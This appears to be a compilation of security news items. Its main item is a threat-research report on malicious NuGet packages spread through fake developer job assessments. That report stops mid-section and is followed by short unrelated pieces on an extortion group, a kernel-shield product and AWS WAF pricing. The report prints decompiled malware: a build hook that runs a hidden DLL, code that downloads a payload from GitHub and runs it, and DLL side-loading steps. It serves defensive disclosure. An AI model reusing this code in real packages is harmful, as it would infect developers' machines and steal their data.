Title: 13 Malicious NuGet Packages Target .NET Developers With Fake Job Assessments
Context: One git identity, Gabriel, made the first commit in all three fake axios repositories, and its GitHub account, gabsantosbus-star, released the wallet app (D)
Full Text:
Socket’s Threat Research Team identified 13 malicious NuGet packages from an operation that uses fake job “Home Assessment” projects to target Windows .NET developers. Most of the packages pose as WinUI 3 and WPF button controls. In the versions we analyzed, building or running a project that uses them downloads files from GitHub, stages a DLL side-loading pair around the Microsoft On-Screen Keyboard (osk.exe), or downloads and runs an executable. One package, WinUI.Button 1.0.0, remains listed on NuGet at the time of writing. NuGet has removed the other 12.

The operation began on npm in July 2026 and hosts its payloads on GitHub. Our analysis found:

A build-time stager. VS_Builder.MSBuildAnalyzer, later republished as HappyOne.MSBuildAnalyzer, ships an MSBuild targets file, build/VS_Builder.MsBuildAnalyzer.targets, that runs a bundled DLL after every build. In the version bundled with the lure, that DLL downloads a file from GitHub to %LOCALAPPDATA%\osk\OskSupport.dll and copies C:\Windows\System32\osk.exe next to it.

A runtime trigger. The FileButton control in the lure’s VS_Builder.WinUI3Controls package starts the copied osk.exe when the app first creates the control. osk.exe and osksupport.dll are a publicly documented DLL side-loading pair.

A downloader in a button control. Creating a WUIButton control from WinUI.Button starts a background task in lib/net8.0-windows10.0.19041/WinUI.Button.dll that downloads avast.exe through the GitHub API with an embedded access token, saves it as %TEMP%\Launcher.exe and runs it.

Executables disguised as project files. Two fake axios repositories serve Windows executables named lib/env/axios.csproj. Their commit history holds a loader that uses a GitHub repository, reached with an embedded token, as two-way command and control (C2), a Chrome profile stealer that uploads to GitHub, and a payload that reports to Telegram.

A trojanized wallet app. A “Crypto Wallet Analyzer” app released on GitHub on November 13 hides a new build of that loader in a bundled DLL.

Five Infection Paths, One Operation #

The diagram below shows five infection paths from one operation. These links tie them together:

A shared owner (A and C). stevenleedig-ux owns the assessment (A) and one of path C’s two fake axios repositories.

The npm packages and the ClickFix page (E). Six npm packages pull payloads from the other fake axios repository and from a third, whose owner figma-share hosts the ClickFix page (E).

A shared git identity (D). One git identity, Gabriel, made the first commit in all three fake axios repositories, and its GitHub account, gabsantosbus-star, released the wallet app (D).

A shared publisher. HappyOne, which republished the stager, published seven of the 13 packages in July and August.

Token ties (B). WinUI.Button (B) shares a White-Super owner name and a token-based GitHub download with path C. Web3TotalButton shares that naming and WinUI.Button’s description.

An owner, a git identity, two email addresses, a publisher and a naming pattern tie the five paths and the npm packages together.

A WinUI 3 Take-Home Test That Must Be Built on Windows #

The most recent lure we found is the public GitHub repository stevenleedig-ux/WinUI3_Home_Assessment, created on November 4, 2026. Its README presents “[Home Assessment] WinUI 3 - Mini File Vault & Tracker”, a three to four hour exercise built on a starter Visual Studio solution. Candidates are told that building the project shows the starter UI and that the work must be developed and tested on native Windows with Visual Studio 2026. We could not determine how the Home Assessment lures reach candidates; we found no recruiter message, email or job post for them, unlike the wallet app lure described below.

The README sets two tasks, styling the list entries by type and validating new paths, and both revolve around a list of file paths that the app renders with a button control supplied through NuGet, FileButton. The README instructs: “Do not alter the inner workings or styles of the external FileButton itself”. Candidates may only set its exposed properties (Background, HoverColor, TextCustomColor and CornerRadius). The rule steers candidates away from the control that carries the runtime trigger described below.

The lure’s task list tells candidates not to alter the external FileButton control.

The starter window pre-loads two sample entries, C:\Windows and the Windows hosts file, each rendered with controls:FileButton, so opening the main window creates the control.

Thirteen Packages Under Four NuGet Accounts #

The NuGet side of the operation ran from July 23 to November 4, 2026, across four accounts:

HappyOne: WinUI3IconButton, RevertButtonIcon, WindowsAccentColorName, SetButtonColor, InitializeCustomButton, StyledAppButton and StyledComponent (July and August), then HappyOne.MSBuildAnalyzer and HappyOne.WinUI3Controls (November 4).

Carol-White-Super: WinUI.Button (September 2).

Steven-White-Super: Web3TotalButton (October 25).

VS_Builder: VS_Builder.MSBuildAnalyzer and VS_Builder.WinUI3Controls (November 2).

These 13 IDs had 28 versions on NuGet. The controls target WinUI 3 with the Windows App SDK (WinUI.Button, Web3TotalButton, WinUI3IconButton and both WinUI3Controls packages) or WPF-style net8.0-windows7.0 (StyledAppButton and StyledComponent).

NuGet lists Web3TotalButton, VS_Builder.MSBuildAnalyzer and VS_Builder.WinUI3Controls as malware in its public removal log. Socket flags RevertButtonIcon, SetButtonColor and InitializeCustomButton as malware: the first two download a Windows executable to the user’s temp folder and run it, and InitializeCustomButton starts the copy that SetButtonColor drops. Five more are tied to the set by dependency or by the lure: WinUI3IconButton (from version 1.1.4), StyledAppButton and StyledComponent depend on other packages in the set, WindowsAccentColorName is a dependency of SetButtonColor and InitializeCustomButton, and HappyOne.WinUI3Controls is the FileButton package the lure switched to.

How the Assessment Infects a Candidate’s Machine #

A Package Feed Inside the Repository

The first commit, bfb103a (November 4, 12:41 UTC), adds a Packages folder holding VS_Builder.MSBuildAnalyzer.1.2.7.nupkg and VS_Builder.WinUI3Controls.1.0.7.nupkg, and sets RestoreAdditionalProjectSources so that NuGet restores from that folder. The second commit, d45e9f3, corrected the folder path. Neither version has a NuGet catalog entry or the repository signature that NuGet adds to every package it serves. The DLLs inside both packages are timestamped minutes before the first commit and about 36 hours after NuGet deleted the VS_Builder account’s packages.

The project file also sets DisableFastUpToDateCheck to true. According to Microsoft’s documentation, this makes Visual Studio bypass its own fast up-to-date check and use MSBuild to decide whether the project needs rebuilding. The reference to the analyzer package sets PrivateAssets to all and ExcludeAssets to runtime, which keeps its DLL out of the application while leaving its build logic active.

In the first lure commit, the project file adds a local package source and references both bundled packages.

An MSBuild Target That Runs After Every Build

NuGet automatically imports a package’s build/<package_id>.targets file into every project that references the package. NuGet matches that file name case-insensitively, so VS_Builder.MsBuildAnalyzer.targets loads for the package ID VS_Builder.MSBuildAnalyzer. The targets file in the lure’s 1.2.7 package is identical (SHA-256 33510d8e48c26279c0c212b4e6e5f95b7f0a116061eae7f50241f81903be5b6b) to the build/VS_Builder.MsBuildAnalyzer.targets that VS_Builder.MSBuildAnalyzer 1.1.3 shipped on NuGet.

Its first target fails the build unless the project’s target framework starts with net8.0-windows or equals net10.0. The second target runs the stager:

<Target Name="ExecuteInlineCSharpTarget" AfterTargets="Build" Condition="'$(TargetFramework)' == 'net10.0' OR $(TargetFramework.StartsWith('net8.0-windows'))" Inputs="$(MSBuildProjectFullPath)" Outputs="$(TargetDir)ForceExecuteNonExistenFile.txt"> <PropertyGroup> <_AnalyzerLibFolder Condition="$(TargetFramework.StartsWith('net8.0-windows'))">net8.0</_AnalyzerLibFolder> <_AnalyzerLibFolder Condition="'$(TargetFramework)' == 'net10.0'">net10.0</_AnalyzerLibFolder> </PropertyGroup> <Exec Command="dotnet "$(MSBuildThisFileDirectory)..\lib\$(_AnalyzerLibFolder)\MSBuildAnalyzer.dll"" WorkingDirectory="$(TargetDir)" IgnoreExitCode="true" ContinueOnError="true"> <Output TaskParameter="ExitCode" PropertyName="_AnalyzerExitCode" /> </Exec> </Target>

ExecuteInlineCSharpTarget runs after Build and launches dotnet on MSBuildAnalyzer.dll from the package’s own lib folder. Its Outputs value names ForceExecuteNonExistenFile.txt, a file that nothing creates, so MSBuild never treats the target as up to date and runs it on every build. IgnoreExitCode and ContinueOnError keep a failure in this step from failing the build.

The Stager Hides a Download Behind Decoy Build Analysis

MSBuildAnalyzer.dll describes itself as an “MSBuild Compatibility Analyzer” and lists “Microsoft” as its company. Its entry point wraps everything in an empty catch. The pipeline first makes 17 decoy calls that parse a hard-coded build log, check toolset and SDK versions, and list the local NuGet package cache without using the result. It then does the real work, shown here from the decompiled BuildPipeline class:

_executor.Execute("InitializeToolset", delegate { byte[] toolset = LoadToolsetManifest(); byte[] config = LoadSolutionConfig(); PropertyOverrideEngine.ApplyBuildPropertyOverride(toolset, config); string outputPath = ResolveProjectOutputPath(toolset, config); string emitPath = ResolveArtifactEmitPath(); _executor.Execute("RestorePackages", delegate { try { byte[] payload = PackageFeedResolver.RestorePackageArtifact(outputPath); ArtifactEmitter.EmitBuildArtifact(emitPath, payload); ReplicateSystemDiagnosticHost(); } catch { } }); });

LoadToolsetManifest and LoadSolutionConfig rebuild a key and an encrypted blob from 8-character Base64 fragments spread across classes named ToolsetRegistry, SolutionConfig and PlatformConfig. The blob is XORed with the key and then decrypted with AES-256-CBC under the same key. The file paths use the same scheme with their own fragment arrays. Decrypting all four values statically produces:

https://raw[.]githubusercontent[.]com/stevenleedig-ux/fantastic-giggle/main/src/demos/SPGO/build.docker osk/OskSupport.dll System32\osk.exe osk\osk.exe

The stager downloads that URL with a default HttpClient and writes the bytes to %LOCALAPPDATA%\osk\OskSupport.dll:

internal static byte[] RestorePackageArtifact(string feedLocation) { using HttpClient httpClient = new HttpClient(); return httpClient.GetByteArrayAsync(feedLocation).GetAwaiter().GetResult(); }

It then copies the Windows On-Screen Keyboard into the same folder:

string path = ResolvePathManifest(_diagnosticHostSourceKeyFragment, _diagnosticHostSourceDataFragment); string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), path); if (!File.Exists(text)) { return false; } string path2 = ResolvePathManifest(_diagnosticHostTargetKeyFragment, _diagnosticHostTargetDataFragment); string text2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), path2); string directoryName = Path.GetDirectoryName(text2); if (!string.IsNullOrEmpty(directoryName) && !Directory.Exists(directoryName)) { Directory.CreateDirectory(directoryName); } if (File.Exists(text2)) { FileInfo fileInfo = new FileInfo(text); FileInfo fileInfo2 = new FileInfo(text2); if (fileInfo.Length == fileInfo2.Length && fileInfo.LastWriteTimeUtc == fileInfo2.LastWriteTimeUtc) { return true; } } File.Copy(text, text2, overwrite: true);

The stager never runs anything it writes. The repository named in that URL, stevenleedig-ux/fantastic-giggle, returned HTTP 404 during our analysis, so the file it served is unknown. HappyOne.MSBuildAnalyzer 1.2.9, the NuGet package the lure later switched to, ships the same targets file content (identical SHA-256) as build/HappyOne.MsBuildAnalyzer.targets and a rebuilt lib/net8.0/MSBuildAnalyzer.dll of the same size.

FileButton Starts the Copied osk.exe

The second lure package, VS_Builder.WinUI3Controls 1.0.7, names “Microsoft” as its author and describes a button that routes clicks to Windows files and folders. Its FileButton does that when clicked, and it is the control the README asks candidates to style. The constructor also ends by calling TryInitializeEnvironmentCompatibilityProbe(), right after it wires up the click handler. That method starts the probe target:

private void TryInitializeEnvironmentCompatibilityProbe() { if (_environmentProbeExecuted) { return; } _environmentProbeExecuted = true; if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) { return; } try { string text = ResolveEnvironmentProbeTarget(); if (!string.IsNullOrWhiteSpace(text) && File.Exists(text)) { if (IsEnvironmentProbeActive(text)) { WriteDiagnosticLog("[Environment Probe Skipped] An active probe instance was detected. Duplicate launch suppressed.", "Info"); return; } Process.Start(new ProcessStartInfo { FileName = text, UseShellExecute = true, WindowStyle = ProcessWindowStyle.Hidden }); WriteDiagnosticLog("[Environment Probe Initialized] Compatibility probe launched successfully.", "Info"); }

The launch target is rebuilt from fragment arrays with the same Base64, XOR and AES-256-CBC scheme the stager uses:

private static readonly string[] _environmentProbeKeyFragment = new string[6] { "NKz0WUpm", "4uBA9fcO", "8xN+xj87", "Ngke7RXP", "pHuflllg", "juk=" }; private static readonly string[] _environmentProbeDataFragment = new string[6] { "Cfkat+8b", "QxS3w6TZ", "HTo1CZJP", "Bc3qCGOq", "as+xamPH", "8JY=" };

These decrypt to osk/osk.exe, which the control joins to %LOCALAPPDATA%. A static flag limits the launch to the first FileButton created in the process, a process check skips it when that exact path is already running, and the window is hidden. The WriteDiagnosticLog calls build their messages and discard them, so the “logging” is cosmetic. The control’s default tooltip templates are Korean strings meaning “Open folder” and “Run file”, a language artifact rather than an attribution signal.

HijackLibs lists osk.exe as a Windows executable that, when copied to a user-writable folder next to a malicious osksupport.dll, runs that DLL’s code through the legitimate program. That is the layout the two packages create. We did not test the side-load, and whether a copied osk.exe starts from %LOCALAPPDATA%\osk on current Windows builds remains an open question.

Neither package works alone. The build-time package only stages files, and the runtime control only launches a file that must already exist. A candidate who builds the project and then runs it, as the README requires, triggers both halves.

The Lure Worked Around a NuGet Takedown

The VS_Builder account published VS_Builder.MSBuildAnalyzer 1.0.1 without a targets file on November 2, added the first build hook in 1.0.2 about ten minutes later, and followed with 1.0.8, 1.1.2, 1.1.3 and VS_Builder.WinUI3Controls 1.0.6 the same day. NuGet unlisted all of them at 20:15 UTC and deleted them at 23:57 UTC on November 2.

About 39 hours later, HappyOne published HappyOne.MSBuildAnalyzer 1.2.8. That version still carried the targets file under its old name, build/VS_Builder.MsBuildAnalyzer.targets, which NuGet does not import for the new package ID. Version 1.2.9 fixed the name 26 minutes later. Twelve minutes after that, commit 9e9384a moved the lure from its bundled packages to HappyOne.MSBuildAnalyzer 1.2.9 and HappyOne.WinUI3Controls 1.0.9 on NuGet.

Commit 9e9384a swaps the bundled VS_Builder packages for HappyOne packages from NuGet.

The final commit, 0bb379c at 17:15 UTC, keeps only HappyOne.WinUI3Controls 1.1.0, published eight minutes earlier, and removes DisableFastUpToDateCheck. We could not determine what version 1.1.0 or HappyOne.MSBuildAnalyzer 1.3.0 do. NuGet unlisted and deleted every HappyOne package on November 6, so the lure no longer restores as committed, but its first two commits carry the bundled 1.2.7 and 1.0.7 packages.

WinUI.Button Downloads and Runs an Executable From Its Constructor #

WinUI.Button 1.0.0 was published on September 2, 2026, by Carol-White-Super. At the time of writing, it remains listed and installable, with about 160 downloads according to the NuGet search API. Download counts include mirrors and scanners and are not victim counts.

In the decompiled WinUI.Button 1.0.0, the WUIButton constructor starts a background routine that downloads avast.exe from Carol-White-Super/cloud with an embedded GitHub token, saves it as Launcher.exe and runs it.

The package metadata describes a harmless control:

<id>WinUI.Button</id> <version>1.0.0</version> <authors>Carol-White-Super</authors> <description>A beautiful and customizable Button control for WinUI 3 applications.</description> <tags>WinUI WinUI3 Button Control XAML WindowsAppSDK</tags> <repository type="git" />

Most of WinUI.Button.dll is a working calculator key with Number, Operator, Function and Equal styles. The decompiled constructor adds one thing:

public WUIButton() { Core m_core = new Core(); Task.Run(() => m_core.Init()); }

WinUI creates controls through the generated XAML type provider, so placing a WUIButton in XAML markup is enough to run the constructor:

private object Activate_0_WUIButton() { return new WUIButton(); }

Nothing runs at install or build time. The code runs when an application that uses the control opens a window containing it. Downloader.Core.Init first takes a named mutex, so the downloader runs once per process and in only one process at a time:

private readonly string owner = "Carol-White-Super"; private readonly string repo = "cloud"; private readonly string path = "db"; private readonly string branch = "Main"; private static Mutex appMutex; public async Task Init() { string name = "Global\\MyUniqueApplicationGuid-12345"; appMutex = new Mutex(initiallyOwned: true, name, out var createdNew); if (!createdNew) { return; } string githubApiUrl = $"https://api.github.com/repos/{owner}/{repo}/contents/{path}/avast.exe?ref={branch}"; string savePath = Path.Combine(Path.GetTempPath(), "Launcher.exe");

The request authenticates with a 93-character fine-grained GitHub token stored in plain text in the DLL (github_p(redacted), SHA-256 9bc1be99462f89880e1e22d9d3ade01cbbfe8bae54a27125e0129542f92ce93f) and asks the GitHub contents API for the raw file:

using HttpClient client = new HttpClient(); client.Timeout = TimeSpan.FromSeconds(30.0); client.DefaultRequestHeaders.UserAgent.ParseAdd("MyUpdater"); client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token); client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/vnd.github.raw")); using (HttpResponseMessage response = await client.GetAsync(githubApiUrl)) { response.EnsureSuccessStatusCode(); using FileStream fs = new FileStream(savePath, FileMode.Create, FileAccess.Write, FileShare.None); await response.Content.CopyToAsync(fs); } downloaded = true;

Every exception is swallowed. After a failure, the loop waits one to four seconds and tries again with no retry limit. The file is then started through the Windows shell unless a process with the same path is already running:

if (!downloaded) { await Task.Delay(TimeSpan.FromSeconds((double)random.Next(1, 5))); } if (File.Exists(savePath)) { break; } } } try { if (!IsApplicationRunning(savePath)) { Process.Start(new ProcessStartInfo { FileName = savePath, UseShellExecute = true }); } }

On later launches of the same app, the download is skipped and Launcher.exe is started again if it is not running. The only secret this code sends is the threat actor’s own token, to the GitHub API, and it collects no victim data itself. The GitHub account Carol-White-Super returned 404 during our analysis, so the second stage, avast.exe, is unrecoverable. With the account gone, an app built with the control keeps sending authenticated requests to the GitHub API every few seconds while it runs. We did not use the embedded token.

A public GitHub repository created on September 5, three days after the package was published, contains a WinUI 3 calculator that references WinUI.Button 1.0.0, pins the exact SDK versions the package depends on, and builds its keypad from 24 WUIButton controls. We could not determine whether the repository belongs to the threat actor or to a targeted developer, so we do not name it.

Windows Executables Disguised as axios Project Files #

Two GitHub repositories, jason-code-super/axios (created on July 23, 2026, 78 seconds after its account) and stevenleedig-ux/axios-http (created on August 10 by the account that owns the lure), are threat actor copies of the axios JavaScript library renamed axios-test-one. Both serve a Windows executable at lib/env/axios.csproj, a name that looks like part of a .NET project.

Both lib/env/axios.csproj files begin with the MZ header and DOS stub of a Windows executable rather than MSBuild XML.

Both repositories started with the same file at lib/env/axios.exe, an unmodified, Microsoft-signed copy of Sysinternals Autoruns 13.96 used as a placeholder. In stevenleedig-ux/axios-http it was renamed to axios.csproj in a single commit, and in jason-code-super/axios it was deleted and uploaded again under the new name. The threat actor then swapped payloads through GitHub’s web interface. Besides the placeholder, the history of the two repositories holds nine binaries:

jason-code-super/axios: a loader whose export directory is named msedgewebview2.exe (July 24), two builds of a PyInstaller Chrome profile stealer (August 1, each removed within 90 minutes), and two builds of a loader named updater.exe (August 4). At the time of writing, the repository serves the second updater.exe.

stevenleedig-ux/axios-http: a payload whose build path names it WeapF (August 10), followed by three Themida-protected builds (August 27 to September 2). At the time of writing, it serves the last Themida build.

The commit history of stevenleedig-ux/axios-http shows axios.exe renamed to axios.csproj on August 10, 2026, followed by four delete and re-upload cycles through September 2.

The July and August HappyOne packages are deleted from NuGet, but their publication times track these repositories. RevertButtonIcon 1.0.1 appeared 72 minutes after axios.csproj first appeared in jason-code-super/axios, and WindowsAccentColorName and SetButtonColor were published 20 and 52 minutes after the timestamp of the first commit in stevenleedig-ux/axios-http. We treat that as timing evidence only.

A Loader That Uses a GitHub Repository as C2

updater.exe is a 64-bit native program with a statically linked JSON library. Its strings are Base64-encoded and XORed with a single byte that changes from string to string, as in these three:

t6WyuLSgnp2ckPCI/JKFkJ2ck7C3pbK6vLC37fc= CxcXExBZTEwCEwpNBAoXCxYBTQAMDkwRBhMMEEwpAg4GEE40CwoXBk4wFhMGEUwxBgIAFzwTEQlMAAwNFwYNFxBMEQYCABdOARYRBAYRTBMWAQ8KAA== oazSyM2b5eK9m42ahomFjdLIzZvl4q2QnI2ahomE0sjNm+XioIebnIaJhY3SyM2b5eKnu9LIzZvAzZvB5eKlqaupjIyajZub0sjNm+Xiuqml0sjNm+Xiu5yHmomPjdLIzZs=

They decode to the payload key passphrase, the C2 location and a host profile template:

asdnbvHKJF&^*DSFKJEfasdljfa;! <https://api>[.]github[.]com/repos/James-White-Super/React_prj/contents/react-burger/public ID: %s\r\nUsername: %s\r\nExternal: %s\r\nHostname: %s\r\nOS: %s(%s)\r\nMACAddress: %s\r\nRAM: %s\r\nStorage: %s

Before any network traffic, the loader checks its environment. The checks must finish within 2,000 milliseconds, and the loader stops if the machine has less than 4 GiB of RAM or less than 60 GiB of disk, reports a VMware, Xen, Hyper-V, KVM, QEMU or VirtualBox hypervisor, carries virtual machine drivers, or has analysis tools such as Wireshark, Process Monitor, x64dbg, Ghidra, IDA Pro or Burp Suite installed. It also inspects storage, firmware, processor and debugger state. Any failed check makes the loader delete itself. The first updater.exe build also waits five minutes before its first network request; the second build drops that delay.

The loader then confirms internet access through Google’s generate_204 endpoint, looks up its external IP address through api.ipify.org, and talks to the GitHub contents API with an embedded fine-grained token:

It requests <victim ID>/log1.dat under the C2 path. If GitHub answers 404, it creates that file with the commit message downloading new version. The file holds the host profile from the template above, Base64-encoded but not encrypted, with its ID derived in part from the Windows MachineGuid.

It requests <victim ID>/log2.dat. If that file exists, the loader downloads its content through the download_url that GitHub returns, takes the first 16 bytes as the IV and decrypts the rest with AES-256-CBC under the SHA-256 hash of the passphrase.

Otherwise it waits 10 seconds and starts over.

It maps the decrypted PE file in memory, calls its exported Start function, and deletes itself with a batch file.

Each new victim appears as a folder in the C2 repository, and the threat actor can stage a different payload for each one. GitHub requests use a Chrome Client Hints string as the User-Agent, and the WinHTTP session is named CppHttp/1.0. The C2 repository returns 404 to unauthenticated requests, and we did not use the token.

The July msedgewebview2.exe build is an earlier version of the same loader with a different string encoding (Base64 with each character shifted up or down by one), a different C2 repository, James-Tran-Dev/teris, and fewer anti-analysis checks. The same binary was hosted as lib/env/axios-telemetry.json in a third repository, figma-share/axios-http, two days before it appeared in jason-code-super/axios.

A Chrome Profile Stealer That Uploads to GitHub

The two August 1 builds are PyInstaller programs built with Python 3.14 and three custom modules, vss, backup and github_upload. Their module strings show the flow. Hidden PowerShell creates a Volume Shadow Copy through the WMI Win32_ShadowCopy class. The stealer then collects the Chrome User Data folders whose names start with Profile, plus the files at the top level of User Data, zips them, splits the archives into .part files and uploads each part with a GitHub contents API PUT and the commit message Backup <name>. The destination is gabsantosbus-star/EngineeringRepository, a repository under the lure-authoring account described below, reached with a classic GitHub token (ghp_nkZZ(redacted)). The second build adds timestamped, per-user folders.

In Chrome’s standard layout, those folders hold saved logins, cookies, history and extension data, and the top-level Local State file holds the key that protects saved passwords and cookies. No Default string appears in the stealer’s main script, so Chrome’s default profile may be skipped, and creating a shadow copy normally requires administrator rights.

WeapF Reports to Telegram Behind a Fake Microsoft Signature

The August 10 payload in stevenleedig-ux/axios-http carries the build path D:\Work\Codes\WeapF\x64\Release\Payload.pdb and an Authenticode signature from a self-signed certificate whose subject and issuer are both CN=Microsoft Windows Publisher. The signature matches the file but chains to no trusted root. Its strings are assembled on the stack and XORed with 0x55.

The program checks for a debugger, enumerates processes, sleeps for one minute or one hour depending on a branch, and adds itself to HKCU\Software\Microsoft\Windows\CurrentVersion\Run. It then fetches an AES-GCM-encrypted configuration from the README.md of the GitHub repository jeksifjeksjejcks/test, which supplies the JSON fields tg and url, and reports the computer name, user name, time zone and CPU model through the Telegram Bot API sendMessage method. Its User-Agent is a garbled browser string containing AppleWevKit/537.36 (KHTM@. Strings for a C:\Windows\System32\winrse.exe drop path, a hidden PowerShell self-removal command and a rundll32.exe shell32.dll,ShellExec_RunDLL launch are present, but we did not trace their use. The configuration repository returns 404, so the bot token and follow-on payload are unknown.

The same payload, identical apart from seven bytes in its PE header and the signature appended to the signed copy, is embedded in an LGA.exe from an earlier lure (described below) that was uploaded the day before the signed copy appeared in stevenleedig-ux/axios-http. The behavior of the three later Themida builds cannot be recovered statically.

A Trojanized Wallet Analyzer Carries a New Loader Build #

On November 13, 2026, gabsantosbus-star, the GitHub account behind the shared lure-authoring identity (described below), published a GitHub release of “Crypto Wallet Analyzer”, a single-file .NET app. The README presents the app as a first-stage client deliverable that inventories eight crypto wallet extensions in Chrome profiles and makes no network requests. The visible app does only that, but its decompiled MainWindow constructor also loads a native DLL bundled in the executable:

string lpFileName = FindBundledDll("vcruntime146_cor2.dll"); _dllHandle = LoadLibrary(lpFileName); if (_dllHandle == IntPtr.Zero) { throw new Win32Exception(Marshal.GetLastWin32Error(), "Self-contained error"); }

The DLL’s name imitates the WPF runtime’s vcruntime140_cor3.dll, and the app’s dependency manifest does not list it. The DLL starts a background thread when loaded, and closing the window only hides it, so the process keeps running.

The DLL is a new build of the GitHub C2 loader described above, with the export-directory name dropper_dll.dll and a single export, JSON_OBJECT. Its strings are encoded with an affine mod-127 scheme instead of Base64 and XOR, but they decode to the same log1.dat and log2.dat paths, downloading new version commit message and CppHttp/1.0 agent, plus a new payload key passphrase and a new C2 repository, Best-Seller-Dev/dexTrader, reached through the GitHub contents API with an embedded fine-grained token. The Best-Seller-Dev account returned 404 during our analysis, so the next stage is unknown, and we did not use the token.

We found one place where this lure was advertised. On November 7, a client account created two days earlier on LaborX, a freelance marketplace that pays in cryptocurrency, posted an $8,500 to $10,000 job for a C# WPF “Crypto Wallet Analyzer” whose requirements include delivering complete source code through GitHub at each development stage. LaborX’s Telegram channel promoted the job on November 9. The client profile uses the real company brand from the lead-generation lure described below, and the job describes the same app, a read-only inventory of installed wallet software.

Shared Infrastructure and Attribution #

npm First, Then NuGet

Between July 14 and July 23, 2026, the threat actor published six packages that OSV documents individually from Amazon Inspector reports: axios-test-one, telemetry-metrics, telemetry-axios, axios-native, fs-extra-core and vitest-axios. Per OSV, telemetry-metrics and telemetry-axios download a Windows executable from ThoSuperstarDev/axios-http and run it, fs-extra-core downloads one from jason-code-super/axios and saves it as msedgewebview2.exe, and the axios clones pull those packages in. ThoSuperstarDev is the former name of figma-share. Their three npm accounts, gsanbus, jasonsayman and jasonsuperstar, use the email addresses of Gabriel, figma-share and jason-code-super, respectively. All six were gone from npm by July 23. Title: Inception - possibly a ShinyHunters reboot - claims seven victims in a week
Context: “While this threat cluster has changed their brand affiliation, the operators remain active in targeting organizations with voice phishing attacks and account takeovers...
Full Text: Don't mind the recent arrests. The ShinyHunters extortion gang may still be operating, just under the new name of Inception, according to Okta's threat intelligence group. ShinyHunters is the brash cybercriminal group that, most recently, breached rival gang Clop before hacking the FBI, resulting in at least three arrests of key suspects in September and October. The crims - and their old data leak site - have since gone dark. “While this threat cluster has changed their brand affiliation, the operators remain active in targeting organizations with voice phishing attacks and account takeovers resulting in data theft and extortion,” Okta threat hunters Moussa Diallo and Katie Nickels said on Monday. Okta tracks this threat cluster as O-UNC-053 - the “O-UNC” prefix stands for an Okta Uncategorized cluster, and it uses this label before formally attributing the activity to a named threat group. While Okta hasn't formally confirmed O-UNC-053 to be the same crime crew as ShinyHunters, the identity and access management provider’s researchers note that it does use nearly identical social engineering tactics: voice phishing, during which the scammers trick targets into entering credentials into phishing pages and approving multi-factor authentication (MFA). Plus, they note: O-UNC-053 operators change the themes of their phishing domains about every four to six weeks, and they also post claimed victims on ShinyHunters’ data leak site. In November, however, organizations targeted by O-UNC-053 began appearing on a new data leak site branded as Inception and not ShinyHunters. The first five - Advanced Micro Devices, Cigna Healthcare, Paychex, PepsiCo, and Henry Schein - appeared November 17 on the site, and all were marked “leaked.” Soon after, security maven Dominic Alvieri questioned if Inception was linked to ShinyHunters. “ShinyHunters are not all in jail,” he wrote on social media. On November 19, AutoZone appeared on the site, with Inception again claiming to have leaked the auto-parts retailer's files. On Saturday, EV technology firm Lucid Group joined the claimed victims. None of the seven companies have confirmed breaches, and none responded to The Register’s inquiries. We will update this story when we receive more information. Okta Threat Intelligence “is unable to validate if published data is authentic,” the researchers said in response to our questions. In the Monday report, the Okta team does note that Inception’s new data leak site listings “included multiple targets for which Okta Threat Intelligence previously observed O-UNC-053 infrastructure registration.” The infrastructure was registered between six and 19 days before Inception listed the companies on its leak site, and this gap “is consistent with prior shifts from Com-affiliated actors,” Diallo and Nickels added. The Com (short for community) is a loosely knit network of online groups whose young members participate in a range of illicit activities including hacking, swatting, digital extortion, real-life shootings, and other physical violence. Many security researchers consider ShinyHunters to be connected to The Com, along with groups such as Scattered Spider and LAPSUS$, with overlapping memberships and shared infrastructure. “Before and after the change in DLS publication, O-UNC-053 maintained consistent infrastructure and TTPs, leading us to assess that the cluster has very likely changed their brand affiliation,” the Okta researchers wrote. “We cannot currently make a high confidence assessment as to whether O-UNC-053 is operating the DLS themselves or is partnering with another extortion actor.” Regardless, members of the group formerly known as ShinyHunters and/or O-UNC-053 are still roaming the internet, looking for new victims, and conducting voice phishing attacks to steal data and then extort victims' companies for exorbitant sums of money. Consider yourself warned - and turn on phishing-resistant MFA.®

Title: OpenAI and Cisco introduce Shirudo
Context: Defense at machine speed: OpenAI and Cisco are designing Shirudo to give agents programmable controls to investigate vulnerabilities, develop targeted shields, and validate...
Full Text:
Live protection: eBPF shields can block vulnerable code paths without restarting the system. Security teams can monitor how a proposed shield would affect applications before enforcing it.

Defense at machine speed: OpenAI and Cisco are designing Shirudo to give agents programmable controls to investigate vulnerabilities, develop targeted shields, and validate their effectiveness against exploits and real workloads. Security teams control what gets deployed.

Trusted deployment: Shields are cryptographically signed and verified before loading. Linux's eBPF verifier checks eBPF programs against its safety rules, while kernel security controls restrict unauthorized changes.

Hardware-backed verification: Shirudo uses a Trusted Platform Module (TPM) to support a verifiable record of protections being loaded or removed. Operators can use this evidence to check whether systems meet their security requirements.

Title: Introducing AWS WAF simplified pricing
Context: Until then, you keep your current pricing, and you don’t need to do anything at launch
Full Text:
Starting today, AWS WAF pricing is easier to predict. Your bill is now based on three dimensions: the resources you protect, the traffic AWS WAF inspects, and the level of protection you apply to that traffic.

Existing AWS WAF customers move to the new pricing on February 1, 2027. Until then, you keep your current pricing, and you don’t need to do anything at launch. This post explains what’s changing, how to estimate your costs under the new model, and where to find full pricing details and examples on the AWS WAF pricing page.

For new or smaller workloads, the Free plan of CloudFront flat-rate pricing plans is another way to start. If your application serves fewer than 1 million requests per month, the Free plan costs $0 per month for each CloudFront distribution. It includes AWS WAF protection against common web threats, DDoS protection, and the CloudFront CDN, with no overage charges.

Why the pricing is changing

Under the previous model, adding a protection often meant adding a charge, so every security decision was also a billing decision. The new pricing separates those two questions and makes the trade off between cost and security posture easy to see. Turning on a rule, the Bot Control common protection, or the Anti-DDoS rule group doesn’t add a subscription or a separate per-request charge. Those requests bill at the base request rate.

Capacity also stops affecting your rate. Each protection pack (web ACL) now includes up to 2,500 web ACL capacity units (WCUs), up from 1,500, and going past your included capacity no longer raises what you pay per request. The premium request fee applies only to the traffic you choose to send through advanced protections.

You can estimate costs before writing a single rule, and those estimates hold even as your rules change. Security rules change often. A new CVE or a shift in bot behavior can require a configuration update the same day. Adding, reordering, or removing rules doesn’t change your rate.

What this means for existing customers

